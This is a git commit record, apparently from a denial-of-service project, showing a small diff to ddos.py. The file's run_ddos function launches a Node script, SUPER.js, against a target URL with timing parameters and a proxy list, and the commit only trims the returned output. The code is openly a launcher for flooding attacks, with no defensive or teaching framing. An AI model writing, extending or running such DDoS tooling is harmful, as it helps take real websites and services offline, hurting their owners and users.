6057af8048a1c232df77a5e15ad0613b46e3269e
Anjaymemek <158371771+GMFR444X@users.noreply.github.com>
2024-06-27 02:51:46 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -3,7 +3,7 @@ import subprocess
 def run_ddos(url):
     try:
         result = subprocess.run(['node', 'SUPER.js', url, '90', '9', '5', 'proxy.txt'], capture_output=True, text=True)
-        return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
+        return result.stdout.strip() if result.returncode == 0 else f"Error: {result.stderr.strip()}"
     except Exception as e:
         return f"Failed to run DDoS: {str(e)}"
     
